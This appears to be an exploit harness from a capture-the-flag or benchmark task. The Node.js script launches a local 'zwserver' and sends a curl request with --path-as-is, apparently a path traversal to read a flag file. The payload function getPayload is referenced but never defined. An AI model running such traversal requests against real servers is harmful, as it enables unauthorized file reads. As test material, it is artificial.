function exploitFunction() {
  const path = require("path");
  const { sleep } = require("sleep");
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  const { exec } = require("child_process");

  // Start the server
  const server = "node ./node_modules/zwserver/server.js";
  exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    // Wait for 2 seconds
    setTimeout(() => {
      // Generate the attack string
      const attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${getPayload()}"`;

      // Execute the attack
      exec(attack_string, (error, stdout) => {
        if (error) {
          console.error(`Error executing attack: ${error}`);
          return;
        }
        console.log(`stdout: ${stdout}`);
      });
    }, 2000); // 2 seconds delay
  });
}

module.exports = { exploitFunction };